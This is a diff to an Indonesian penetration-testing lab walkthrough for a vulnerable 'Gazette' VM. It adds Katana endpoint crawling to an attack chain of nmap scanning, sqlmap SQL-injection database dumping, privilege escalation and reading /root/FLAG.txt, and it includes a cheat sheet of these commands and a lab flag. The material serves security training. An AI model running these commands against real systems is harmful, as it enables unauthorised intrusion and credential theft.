@@ -75,7 +75,7 @@ SQL Injection
 
 ```text
 1. Nmap menemukan port 22 dan 8000
-2. Endpoint /news/detail?id=1 menerima input parameter id
+2. Katana atau browser menemukan /news/detail?id=1 dengan parameter id
 3. SQLMap membuktikan UNION-based SQL Injection
 4. Enumerasi database menemukan database gazette
 5. Enumerasi tabel menemukan tabel users
@@ -120,7 +120,39 @@ nmap -Pn -sC -sV -p22,8000 "$TARGET"
 - Port `22` menjadi kandidat jalur foothold apabila ditemukan kredensial.
 - Jangan langsung mencoba kredensial acak; lakukan pengujian hanya dalam scope lab.
 
-## 4.3 Mengakses Endpoint Berparameter
+## 4.3 Variasi Enumerasi Endpoint dengan Katana
+
+Katana menelusuri tautan aplikasi untuk menemukan endpoint beserta parameter query. Jalankan dari mesin penguji setelah menentukan alamat web:
+
+```bash
+katana -u "$WEB"
+```
+
+Pada screenshot praktik, Gazette menggunakan IP `192.168.56.138`:
+
+```bash
+katana -u http://192.168.56.138:8000
+```
+
+Cuplikan hasil pada screenshot:
+
+```text
+http://192.168.56.138:8000/news/detail?id=6
+http://192.168.56.138:8000/news/detail?id=8
+http://192.168.56.138:8000/news/detail?id=1
+```
+
+IP tersebut berbeda dari contoh utama `192.168.56.121`. Sesuaikan `TARGET`, `WEB`, dan alamat SSH dengan IP VM yang sedang digunakan. Hasil pentingnya adalah pola `/news/detail?id=...`; pilih salah satu ID yang ditemukan, misalnya `1`, untuk baseline dan pengujian berikutnya:
+
+```bash
+URL="$WEB/news/detail?id=1"
+```
+
+Penemuan URL oleh Katana belum membuktikan SQL Injection. Lanjutkan validasi parameter `id` pada bagian 5. Jika tautan tidak ditemukan, periksa halaman berita melalui browser.
+
+Referensi: [penggunaan Katana](https://docs.projectdiscovery.io/opensource/katana/running).
+
+## 4.4 Mengakses Endpoint Berparameter
 
 ```bash
 curl -i "$URL"
@@ -705,6 +737,7 @@ FLAG{d1r7yp1p3_5pl1c35_7h3_r007}
 | Tahap | Evidence minimum |
 |---|---|
 | Recon | Port `22` dan `8000` terbuka |
+| Crawling | Output Katana yang memuat `/news/detail?id=...` |
 | SQLi | Parameter `id`, teknik injection, dan DBMS |
 | Database | Database `gazette` ditemukan |
 | Tabel | Tabel `users` ditemukan |
@@ -825,9 +858,11 @@ Temuan harus dinilai tidak hanya secara individual, tetapi juga berdasarkan damp
 
 ```bash
 TARGET="192.168.56.121"
-URL="http://192.168.56.121:8000/news/detail?id=1"
+WEB="http://192.168.56.121:8000"
 
 nmap -Pn -sC -sV -p22,8000 "$TARGET"
+katana -u "$WEB"
+URL="$WEB/news/detail?id=1"
 
 sqlmap -u "$URL" -p id --batch --dbs
 sqlmap -u "$URL" -p id --batch -D gazette --tables
@@ -885,7 +920,9 @@ cat /root/FLAG.txt
 # 17. Cheat Sheet Singkat
 
 ```bash
-URL="http://192.168.56.121:8000/news/detail?id=1"
+WEB="http://192.168.56.121:8000"
+katana -u "$WEB"
+URL="$WEB/news/detail?id=1"
 
 sqlmap -u "$URL" -p id --batch -D gazette -T users --dump
 
@@ -912,6 +949,7 @@ cat /root/FLAG.txt
 
 ```text
 Nmap 22,8000
+→ Katana → /news/detail?id=...
 → SQLi id
 → --dbs
 → --tables
